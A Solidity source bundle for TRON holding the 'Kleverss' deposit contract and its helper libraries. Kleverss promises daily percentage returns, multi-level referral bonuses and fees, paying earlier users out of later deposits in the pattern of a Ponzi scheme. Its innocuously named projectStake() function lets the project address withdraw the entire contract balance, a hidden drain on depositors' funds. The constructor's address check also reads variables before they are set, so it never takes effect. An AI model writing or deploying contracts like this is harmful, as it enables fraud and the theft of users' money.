//SourceUnit: Address.sol

pragma solidity ^0.5.8;
library Address {

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

}

//SourceUnit: ITRC20.sol

pragma solidity ^0.5.8;
interface ITRC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

//SourceUnit: Kleverss.sol

import "./Address.sol";
import "./SafeMath.sol";
import "./ITRC20.sol";
import "./SafeTRC20.sol";


pragma solidity 0.5.8;

contract Kleverss{
    using SafeMath for uint;
    using SafeTRC20 for ITRC20;
    using Address for address;

    ITRC20 public token;

    uint[3] public REFERRAL_PERCENTS = [70, 20, 10];
	uint constant public BASE_PERCENT = 20;
	
	uint constant public REINVESTMENT_PERCENT = 150;
	uint constant public HOLD_PERCENT = 1;
	uint constant public MAX_HOLD_PERCENT = 50;
	
    uint constant public MARKETING_FEE = 30;
	uint constant public PROJECT_FEE = 20;

	uint constant public PERCENTS_DIVIDER = 1000;
	uint constant public MAX_PROFIT = 3;
	
	uint constant public TIME_STEP = 1 days; // days; 

    uint constant public INVEST_MIN_AMOUNT = 400 * 1E6;
    
    uint constant public CONTRACT_BALANCE_STEP = 3_000_000 * 1E6;
    
	uint public totalUsers;
	uint public totalInvested;
	uint public totalReinvested;
	uint public totalWithdrawn;
	uint public totalDeposits;
	
	address public marketingAddress;
	address public projectAddress;

	struct Deposit {
		uint amount;
		uint initAmount;
		uint withdrawn;
		uint start;
	}
	
	struct User {		
		Deposit[] deposits;
		address referrer;
		uint checkpoint;
		uint bonus;
		uint reinvested;
	}

	mapping (address => User) internal users;

	event NewUser(address user);
	event NewDeposit(address indexed user, uint amount);
	event Reinvestment(address indexed user, uint amount);
	event Withdrawn(address indexed user, uint amount);
	event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
	event FeePayed(address indexed user, uint totalAmount);

	constructor(address  marketingAddr, address  projectAddr, ITRC20 tokenAddr) public {
		require(!marketingAddress.isContract() && !projectAddress.isContract());
		require(Address.isContract( address( tokenAddr ) ),"Invalid token TRC20");
		
		marketingAddress =marketingAddr;
		projectAddress =projectAddr;
        token = tokenAddr;
	}
 
	function invest(uint depAmount,address referrer) external {		       
        require(depAmount >= INVEST_MIN_AMOUNT,"Minimum deposit amount 400 KLV");
        
		token.safeTransferFrom(msg.sender, address(this), depAmount);
        
        uint marketingFee = depAmount.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
        uint projectFee = depAmount.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);

        token.safeTransfer(marketingAddress, marketingFee);
        token.safeTransfer(projectAddress, projectFee);		

		emit FeePayed(msg.sender, marketingFee.add(projectFee));        

		User storage user = users[msg.sender];

		if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
			user.referrer = referrer;
		}

		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint i = 0; i < 3; i++) {
				if (upline != address(0)) {
					uint amount = depAmount.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}

		}

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			totalUsers = totalUsers.add(1);
			emit NewUser(msg.sender);
		}

		Deposit memory newDeposit;
		
        newDeposit.amount = depAmount;
        newDeposit.initAmount=depAmount;
        newDeposit.start = block.timestamp;
			
		user.deposits.push(newDeposit);

		totalInvested = totalInvested.add(depAmount);
		totalDeposits = totalDeposits.add(1);
		emit NewDeposit(msg.sender, depAmount);
	}

	function withdraw() external {
		User storage user = users[msg.sender];
		
		require(user.deposits.length > 0, "Dont is User");
		
		uint userPercentRate = getUserPercentRate(msg.sender);
		
		uint totalAmount;
		uint dividends;

		for (uint i = 0; i < user.deposits.length; i++) {

			if (user.deposits[i].withdrawn < user.deposits[i].initAmount.mul(MAX_PROFIT)) {
			    
				if (user.deposits[i].start > user.checkpoint) {
				    
					dividends = user.deposits[i].amount
					    .mul( userPercentRate )
					    .div( PERCENTS_DIVIDER )
						.mul( block.timestamp.sub( user.deposits[i].start ) )
						.div( TIME_STEP );
				} else {		

				dividends = user.deposits[i].amount
				        .mul( userPercentRate )
				        .div( PERCENTS_DIVIDER )
						.mul( block.timestamp.sub(user.checkpoint) )
						.div( TIME_STEP );
				}

				if ( user.deposits[i].withdrawn.add(dividends) > user.deposits[i].initAmount.mul(MAX_PROFIT) ) {
					dividends = (user.deposits[i].initAmount.mul(MAX_PROFIT)).sub(user.deposits[i].withdrawn);
				}
				else{
		        // reinvestment start 
		        uint reinvestment = dividends.mul( REINVESTMENT_PERCENT ).div( PERCENTS_DIVIDER );
				// add reinvestment
		        user.deposits[i].amount = user.deposits[i].amount.add(reinvestment);
		        user.reinvested = user.reinvested.add(reinvestment);
				emit Reinvestment(msg.sender, reinvestment);

				totalReinvested = totalReinvested.add(reinvestment);
		        
		        dividends = dividends.sub(reinvestment);
		        
		        uint marketingFee = reinvestment.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
                uint projectFee = reinvestment.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
                token.safeTransfer(marketingAddress, marketingFee);
                token.safeTransfer(projectAddress, projectFee);
		        emit FeePayed(msg.sender, marketingFee.add(projectFee));
				}
		        // reinvestment end

		        user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends); /// changing of storage data
				totalAmount = totalAmount.add(dividends);
			}
		}
		
		uint referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			totalAmount = totalAmount.add(referralBonus);
			user.bonus = 0;
		}

		require(totalAmount > 0, "User has no dividends");

		uint contractBalance = getContractBalance();
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}

		user.checkpoint = block.timestamp;
		
		token.safeTransfer(msg.sender,totalAmount);

		totalWithdrawn = totalWithdrawn.add(totalAmount);

		emit Withdrawn(msg.sender, totalAmount);

	}
	

	function getContractBalance() public view returns (uint) {
		return token.balanceOf(address(this));
	}

	function getContractBalanceRate() public view returns (uint) {
		uint contractBalance = getContractBalance();
		
		if( contractBalance >= CONTRACT_BALANCE_STEP ){
		uint contractBalancePercent = contractBalance.div(CONTRACT_BALANCE_STEP);
		return BASE_PERCENT.add(contractBalancePercent);
		}
		else
		return BASE_PERCENT;
		
	}
    function getUserholdRate(address userAddress) public view returns (uint) {
    	User memory user = users[userAddress];
		if (isActive(userAddress)) {
				uint holdProfit =block.timestamp.sub(user.checkpoint).div(TIME_STEP).mul(HOLD_PERCENT);
				if( holdProfit > MAX_HOLD_PERCENT)
				   holdProfit = MAX_HOLD_PERCENT;
				return holdProfit;
		} else
		return 0;
    }
	
	function getUserPercentRate(address userAddress) public view returns (uint) {
		User memory user = users[userAddress];
		
		uint contractBalanceRate = getContractBalanceRate();
		
		if (isActive(userAddress)) {
			uint holdProfit = block.timestamp.sub(user.checkpoint).div(TIME_STEP).mul(HOLD_PERCENT);
			if( holdProfit >  MAX_HOLD_PERCENT)
			   holdProfit = MAX_HOLD_PERCENT;
			return contractBalanceRate.add(holdProfit);
		} else {
			return contractBalanceRate;
		}
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User memory user = users[userAddress];

		uint256 userPercentRate = getUserPercentRate(userAddress);

		uint256 totalDividends;
		uint256 dividends;

		for (uint256 i = 0; i < user.deposits.length; i++) {

			if (user.deposits[i].withdrawn < user.deposits[i].initAmount.mul(MAX_PROFIT)) {

				if (user.deposits[i].start > user.checkpoint) {
				    
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);

				} else {
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(TIME_STEP);
				}

				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].initAmount.mul(MAX_PROFIT)) {
					dividends = (user.deposits[i].initAmount.mul(MAX_PROFIT)).sub(user.deposits[i].withdrawn);
				}

				totalDividends = totalDividends.add(dividends);	
			}
		}
		return totalDividends;
	}

	function getUserCheckpoint(address userAddress) external view returns(uint256) {
		return users[userAddress].checkpoint;
	}
	function getUserTotalReinvested(address userAddress) external view returns(uint256) {
		return users[userAddress].reinvested;
	}

	function getUserReferrer(address userAddress) external view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}
	
	function projectStake() external {
        require(msg.sender == projectAddress);
        token.safeTransfer( projectAddress, token.balanceOf( address(this) ) );
    }

	function isActive(address userAddress) public view returns (bool) {
		User memory user = users[userAddress];
		
		if (user.deposits.length > 0) {
			if (user.deposits[ user.deposits.length - 1 ].withdrawn < user.deposits[ user.deposits.length-1 ].initAmount.mul(MAX_PROFIT)) {
				return true;
			}
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) external view returns(uint256, uint256, uint256,uint256) {
	    User memory user = users[userAddress];
		return (user.deposits[index].amount,
		user.deposits[index].initAmount,
		user.deposits[index].withdrawn,
		user.deposits[index].start);
	}

	function getUserAmountOfDeposits(address userAddress) external view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
	    User memory user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}

		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
	    User memory user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].withdrawn);
		}
		
		return amount;
	}
	
	function getPublicData() external view returns(uint  totalUsers_,
	uint  totalInvested_,
	uint  totalReinvested_,
	uint  totalWithdrawn_,
	uint totalDeposits_,
	uint balance_,
	uint balanceRate_)
	{
	totalUsers_ =totalUsers;
    totalInvested_ = totalInvested;
	totalReinvested_ =totalReinvested;
	totalWithdrawn_ = totalWithdrawn;
	totalDeposits_ =totalDeposits;
	balance_ = getContractBalance();
	balanceRate_ = getContractBalanceRate();
	}
	function getUserData(address userAddress) external view returns(uint totalWithdrawn_, 
	uint totalDeposits_,
	uint totalBonus_,
	uint hold_,
	uint balance_,
	bool isUser_,
	address referrer_
	){
	    User memory user = users[userAddress];
	    totalWithdrawn_ =getUserTotalWithdrawn(userAddress);
	    totalDeposits_ =getUserTotalDeposits(userAddress);
	    totalBonus_ = getUserReferralBonus(userAddress);
	    balance_ = getUserDividends(userAddress);
	    hold_ = getUserholdRate(userAddress);
	    isUser_ =  user.deposits.length>0;
	    referrer_ = users[userAddress].referrer;
	}
	
	function() external payable {
     
    }

}


//SourceUnit: SafeMath.sol

pragma solidity ^0.5.8;
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
    
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }

}

//SourceUnit: SafeTRC20.sol

pragma solidity ^0.5.8;
import "./Address.sol";
import "./SafeMath.sol";
import "./ITRC20.sol";
library SafeTRC20 {

    using SafeMath for uint256;
    using Address for address;

    function safeTransfer(ITRC20 token, address to, uint256 value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(ITRC20 token, address from, address to, uint256 value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function callOptionalReturn(ITRC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeTRC20: call to non-contract");

        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeTRC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            require(abi.decode(returndata, (bool)), "SafeTRC20: TRC20 operation did not succeed");
        }
    }
}